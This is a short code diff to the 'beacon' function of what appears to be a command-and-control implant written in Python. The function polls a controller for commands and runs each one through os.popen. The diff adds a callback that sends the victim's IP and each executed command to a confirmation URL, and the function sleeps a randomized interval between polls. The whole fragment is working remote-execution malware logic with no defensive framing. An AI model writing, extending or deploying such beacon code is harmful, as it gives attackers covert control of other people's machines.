@@ -44,14 +44,15 @@ def beacon():
 			continue
 		commands = json.loads(str(commands.content, 'utf-8'))
 		#check empty command set
-		if commands != None:
+		if commands != '[]':
 			for cmd in commands:
-				#executes comand prints response
+				#executes comand
 				cmds[cmd] = os.popen(cmd).read()
+				#send confirmation of command being rung
+				requests.get('http://localhost/confirm?ip=' + ip + '&cmd=' + cmd) 
+			#print commands
 			print(cmds)
 			#TODO send command respone to server
-			commands = ''
-			commands = requests.get('http://localhost/confirm?ip=' + ip)
 		#wait 3 to 17 seconds to callback
 		time.sleep(10 + offset)
 
